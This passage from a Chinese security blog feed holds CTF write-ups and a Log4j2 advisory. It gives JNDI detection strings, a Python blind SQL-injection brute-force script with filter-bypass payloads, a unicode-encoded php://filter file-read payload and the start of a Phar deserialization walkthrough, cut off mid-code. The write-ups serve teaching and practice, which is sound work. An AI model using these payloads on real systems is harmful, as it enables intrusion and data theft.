        <content type="html"><![CDATA[<blockquote><p> 看我看我，有没有大佬悄咪咪的给我个exp打自己过过瘾</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101705180.png" alt="image-20211210164553234"></p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 </p><p>在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p><p><strong>该漏洞危害等级：严重</strong></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><table><thead><tr><th><strong>Log4j版本</strong></th><th><strong>是否受影响</strong></th></tr></thead><tbody><tr><td>2.x&lt;=2.14.1</td><td>是</td></tr><tr><td>2.15.0-rc1</td><td>是</td></tr><tr><td>2.15.0-rc2</td><td>否</td></tr></tbody></table><p>已知影响组件：</p><ul><li>Apache Struts2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li><li>ElasticSearch</li><li>flume</li><li>dubbo</li><li>Redis</li><li>logstash</li><li>kafka</li></ul><h2 id="当前漏洞状态"><a href="#当前漏洞状态" class="headerlink" title="当前漏洞状态"></a>当前漏洞状态</h2><table><thead><tr><th>细节是否公开</th><th>PoC状态</th><th>EXP状态</th><th>在野利用</th></tr></thead><tbody><tr><td><strong>已公开</strong></td><td><strong>已公开</strong></td><td><strong>已公开</strong></td><td><strong>已发现</strong></td></tr></tbody></table><h2 id="攻击检测"><a href="#攻击检测" class="headerlink" title="攻击检测"></a>攻击检测</h2><p>可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。</p><h2 id="漏洞排查"><a href="#漏洞排查" class="headerlink" title="漏洞排查"></a>漏洞排查</h2><p>代码排查：查看 pom.xml 是否引入 org.apache.logging.log4j、org.apache.logging.log4j2 </p><p>Linux：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name &quot;*log4j-*.jar&quot;</span><br></pre></td></tr></table></figure><p>Windows：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*log4j*.jar</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="Vulfocus-靶场环境"><a href="#Vulfocus-靶场环境" class="headerlink" title="Vulfocus 靶场环境"></a>Vulfocus 靶场环境</h2><p>目前 Vulfocus 已经集成 Log4j2 环境，可通过以下链接启动环境测试：</p><p><a href="http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c">http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c</a></p><p>也可通过 docker pull vulfocus/log4j2-rce-2021-12-09:latest 拉取本地环境运行，本地启动命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101924822.png" alt="image-20211210165957575"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secrss.com/articles/36995">https://www.secrss.com/articles/36995</a></p><p><a href="https://nosec.org/home/detail/4917.html">https://nosec.org/home/detail/4917.html</a></p><p><a href="https://github.com/apache/logging-log4j2">https://github.com/apache/logging-log4j2</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019 SQLi</title>
      <link href="/post/2021-12/%5BNCTF2019%5DSQLi/"/>
      <url>/post/2021-12/%5BNCTF2019%5DSQLi/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p><strong>考点：sql bypass</strong></p><p>一道sql题，非常友好的给出了<code>sqlquery</code>，但想必也不简单</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlquery : <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>这中语句非常典型，不试都能猜到必然过滤了<code>&#39;</code>，在<code>username</code>处使用<code>\</code>转义，语句就变成了这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlquery : <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>但不幸的是我们使用传统的<code>--+</code>和<code>#</code>并没有办法注释掉最后的那个单引号，所以我们可以用<code>%00</code>的实际值（%00的urldecode）来截断最后的单引号。</p><p>因为BUU的429限制，跑字典非常的耗时，所以就随便写了个小字典跑了一下</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101546101.png" alt="image-20211209223445980"></p><p>发现过滤了<code>空格、like、=、and、or</code>一些字段，还好还有些可以用的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> <span class="operator">=</span><span class="operator">&gt;</span> regexp</span><br><span class="line">空格 <span class="operator">=</span><span class="operator">&gt;</span> <span class="comment">/**/</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">||</span></span><br></pre></td></tr></table></figure><p>猜测这题应该就是爆破密码，我们先构造一下payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||1/**/regexp/**/&quot;1&quot;;%00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101546103.png" alt="image-20211209223918441"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||1/**/regexp/**/&quot;2&quot;;%00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101546104.png" alt="image-20211209224004838"></p><p>得到两个的返回页面，证实了<code>payload</code>的可行性，开始编写<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://968b8b9f-ecd5-47dd-8638-c3eeb5519d0b.node4.buuoj.cn:81//index.php&quot;</span></span><br><span class="line">string = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span>  <span class="comment"># 猜测密码由字母 数字 下划线组成</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:</span><br><span class="line">            <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:</span><br><span class="line">            <span class="string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                flag + j, parse.unquote(<span class="string">&quot;%00&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">while</span> (r.status_code == <span class="number">429</span>):  <span class="comment"># 避免访问次数过快产生429从而终止脚本</span></span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 终止条件</span></span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>有的小伙伴就会问了，我的<code>string</code>变量中并未加入大写字母诶，sql语句对大小写不敏感所以无需区分大小写。</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101546105.png" alt="image-20211210153816963"></p><p>还有一个要注意的是，<code>%00</code>需要urldecode加入才有用，不然不能起到截断的作用。</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112101546106.png" alt="image-20211210153908825"></p><p>密码爆出来后，随便使用一个用户名登陆就可以获得<code>flag</code>了，这里将<code>admin</code>给过滤掉了。</p><p>经过看其他师傅的wp，发现通过<code>dirsearch</code>扫描出了<code>robots.txt</code>和<code>hint.txt</code>，提示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019 encode_and_encode</title>
      <link href="/post/2021-12/%5BHarekazeCTF2019%5Dencode_and_encode/"/>
      <url>/post/2021-12/%5BHarekazeCTF2019%5Dencode_and_encode/</url>
      
        <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p><strong>考点：json_decode的unicode编码绕过</strong></p><p>进入题目后，很容易就可以看到源码<code>query.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure><p>通过分析代码，在<code>is_valid</code>函数这块过滤了<code>流控制器</code>和<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里通过<code>post</code>接受<code>json</code>数据然后解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>通过了两个判断</p><ol><li><code>post</code>数据中不能存在黑名单内容，并且有<code>page键</code></li><li>读取的文件内不能有黑名单内容且文件内容不为空</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查阅PHP的<code>json_decode</code>函数，发现Unicode编码后的内容通过<code>json_decode</code>可以被正常解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$body</span> = <span class="string">&#x27;&#123;&quot;page&quot;:&quot;/fl\u0061g&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = json_decode(<span class="variable">$body</span>,<span class="literal">true</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="E:\Typora\images\image-20211208225403126.png" alt="image-20211208225403126"></p><p>因为是对<code>$body</code>进行过滤，最后<code>file_get_contents</code>的参数是解析过后的内容，然后再通过<code>php://filter/read=conver.base64-encode</code>用来绕过第二个判断和最后的<code>replace</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">&#123;<span class="attr">&quot;page&quot;</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&#125;</span><br><span class="line">unicode encode=&gt;</span><br><span class="line">&#123;<span class="attr">&quot;page&quot;</span>:<span class="string">&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这里我用HackBar传json数据失败了，这里用的postman，当然用bp也是可以的</p><p><img src="E:\Typora\images\image-20211208225928494.png" alt="image-20211208225928494"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 编码绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018-SimplePHP</title>
      <link href="/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/"/>
      <url>/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/</url>
      
        <content type="html"><![CDATA[<h1 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1><p><strong>考点：1、PHP代码审计    2、Phar反序列化漏洞</strong></p><p>网站中有两个功能：<code>查看文件</code>和<code>上传文件</code>，利用查看文件将源码都先弄下来进行PHP代码审计。</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在<code>file_exists</code>函数，并且有<code>class.php</code>和<code>upload_file.php</code>（通过类文件可能可以构造反序列化攻击，通过文件上传phar文件可以触发file_exists），猜测应该是Phar反序列化漏洞</p><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span 